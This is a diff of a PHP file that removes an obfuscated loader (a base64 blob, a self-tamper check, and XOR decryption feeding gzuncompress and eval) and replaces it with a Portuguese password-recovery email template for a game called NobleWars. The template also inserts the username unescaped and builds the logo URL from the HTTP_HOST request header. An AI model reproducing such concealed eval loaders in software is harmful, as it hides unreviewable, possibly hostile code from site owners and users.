@@ -1,24 +1,83 @@
 <?php
-$walujt="a9b81f45431cbd1c5177b980a745268d";
-$nlfhmcv="55005708090406055057020257500551010103545b0b0a035806030105535b56";
-$vfhyzjh="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";
-$kkmlbbvol=file_get_contents(__FILE__);
-$ckamgmm=str_replace($vfhyzjh,"",$kkmlbbvol);
-if(strpos($ckamgmm,"ec"."ho")!==false||strpos($ckamgmm,"pr"."int")!==false||strpos($ckamgmm,"var_"."dump")!==false||strpos($ckamgmm,"file_put_"."contents")!==false||strpos($ckamgmm,"fw"."rite")!==false){die();}
-$eonmxykn=str_replace(array($walujt,$nlfhmcv),array("SP_56d5de89","KP_7173c734"),$kkmlbbvol);
-$pwggdrqt=md5($eonmxykn);
-$ptifzvywcw=hex2bin($nlfhmcv);
-$mrsusvzynx="";
-$optfvohu=strlen($pwggdrqt);
-for($tlpsedhh=0;$tlpsedhh<$optfvohu;$tlpsedhh++){
-$mrsusvzynx.=chr(ord($ptifzvywcw[$tlpsedhh])^ord($pwggdrqt[$tlpsedhh]));
-}
-$rpltyowq=base64_decode($vfhyzjh);
-$mkhgcxw=strlen($rpltyowq);
-$ubsabtdi="";
-$ramhpndxeu=strlen($mrsusvzynx);
-for($tlpsedhh=0;$tlpsedhh<$mkhgcxw;$tlpsedhh++){
-$ubsabtdi.=$rpltyowq[$tlpsedhh]^$mrsusvzynx[$tlpsedhh%$ramhpndxeu];
-}
-$mtsnly="gzun"."compress";
-eval($mtsnly($ubsabtdi));
+/**
+ * HTML Email Template for Password Recovery
+ *
+ * @param string $username
+ * @param string $resetLink
+ * @return string
+ */
+return function(string $username, string $resetLink, string $logoUrl = ''): string {
+    if (empty($logoUrl)) {
+        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
+        $logoUrl = $protocol . ($_SERVER['HTTP_HOST'] ?? '127.0.0.1:8000') . "/graphic/index/noblewars.png";
+    }
+
+    return <<<HTML
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Recuperação de Senha - NobleWars</title>
+</head>
+<body style="margin: 0; padding: 0; background-color: #f4e4bc; font-family: 'Georgia', 'Times New Roman', Times, serif; color: #2d1b10; -webkit-font-smoothing: antialiased;">
+    <table border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color: #f4e4bc; padding: 20px 0;">
+        <tr>
+            <td align="center">
+                <!-- Main Card -->
+                <table border="0" cellpadding="0" cellspacing="0" width="100%" style="max-width: 600px; background-color: #f9f3e3; border: 3px double #7d510f; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.15); overflow: hidden;">
+                    <!-- Header Banner -->
+                    <tr>
+                        <td align="center" style="background: linear-gradient(to bottom, #4a2f13 0%, #2d1b10 100%); padding: 20px; border-bottom: 3px double #7d510f;">
+                            <img src="{$logoUrl}" alt="NobleWars" style="display: block; max-width: 180px; height: auto; border: 0;" />
+                        </td>
+                    </tr>
+                    
+                    <!-- Content -->
+                    <tr>
+                        <td style="padding: 40px 30px;">
+                            <h2 style="margin-top: 0; font-family: 'Georgia', serif; font-size: 20px; color: #7d510f; border-bottom: 1px solid #dcd1b4; padding-bottom: 10px;">Recuperação de Senha</h2>
+                            
+                            <p style="font-size: 16px; line-height: 1.6; margin: 20px 0;">Olá <strong>{$username}</strong>,</p>
+                            
+                            <p style="font-size: 16px; line-height: 1.6; margin: 20px 0;">Recebeu esta mensagem porque foi efetuado um pedido de recuperação de senha para a sua conta de jogo no NobleWars.</p>
+                            
+                            <p style="font-size: 16px; line-height: 1.6; margin: 20px 0;">Para redefinir a sua senha e voltar ao campo de batalha, clique no botão abaixo (este link é válido por apenas 1 hora):</p>
+                            
+                            <!-- Button Container -->
+                            <table border="0" cellpadding="0" cellspacing="0" width="100%" style="margin: 30px 0;">
+                                <tr>
+                                    <td align="center">
+                                        <a href="{$resetLink}" target="_blank" style="display: inline-block; padding: 14px 30px; background: linear-gradient(to bottom, #8b5a2b 0%, #6d4c41 100%); border: 2px solid #3e2723; border-radius: 4px; color: #f5f5dc; font-family: 'Georgia', serif; font-size: 18px; font-weight: bold; text-decoration: none; text-shadow: 1px 1px 2px rgba(0,0,0,0.5); box-shadow: 0 4px 6px rgba(0,0,0,0.15); transition: background 0.2s;">
+                                            Redefinir Senha
+                                        </a>
+                                    </td>
+                                </tr>
+                            </table>
+                            
+                            <p style="font-size: 14px; line-height: 1.6; color: #6d4c41; background-color: #f1ebd8; border-left: 4px solid #8b5a2b; padding: 10px 15px; margin: 25px 0; border-radius: 0 4px 4px 0; box-sizing: border-box;">
+                                Se tiver problemas com o botão acima, copie e cole o seguinte link no seu navegador:<br>
+                                <a href="{$resetLink}" target="_blank" style="color: #8b5a2b; word-break: break-all; text-decoration: underline;">{$resetLink}</a>
+                            </p>
+                            
+                            <p style="font-size: 14px; line-height: 1.6; color: #5c5346; margin: 20px 0 0 0;">
+                                Se não solicitou a redefinição de senha, por favor ignore este e-mail. A sua conta permanece totalmente segura.
+                            </p>
+                        </td>
+                    </tr>
+                    
+                    <!-- Footer -->
+                    <tr>
+                        <td align="center" style="background-color: #f1ebd8; padding: 25px 20px; border-top: 1px solid #dcd1b4; font-size: 12px; color: #7d7260;">
+                            <p style="margin: 0 0 5px 0; font-weight: bold; color: #5d4037;">A Equipa NobleWars</p>
+                            <p style="margin: 0;">&copy; 2026 NobleWars. Todos os direitos reservados.</p>
+                        </td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+    </table>
+</body>
+</html>
+HTML;
+};
